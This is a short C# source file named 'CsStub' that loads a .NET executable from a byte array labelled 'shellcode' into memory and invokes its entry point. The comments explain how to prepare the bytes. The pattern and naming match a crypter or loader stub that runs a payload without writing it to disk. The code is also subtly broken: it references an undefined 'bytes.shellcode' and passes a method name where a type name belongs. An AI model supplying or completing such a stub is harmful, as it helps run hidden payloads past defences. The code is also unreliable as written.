using System;
using System.Linq;
using System.Reflection;

namespace CsStub
{
    class Program
    {
        static void Main(string[] args)
        {
            Assembly asm = AppDomain.CurrentDomain.Load(bytes.shellcode); // takes a byte[] of a .net executable
            MethodInfo Metinf = asm.EntryPoint;                          // to obtain the byte[] just use File.ReadAllBytes(exePath) or similar
            object InjObj = asm.CreateInstance(Metinf.Name);
            object[] parameters = new object[1]; // needed for most .net executables. they perform unexpectedly w/out a parameter object 
            Metinf.Invoke(InjObj, parameters);
        }
    }
}
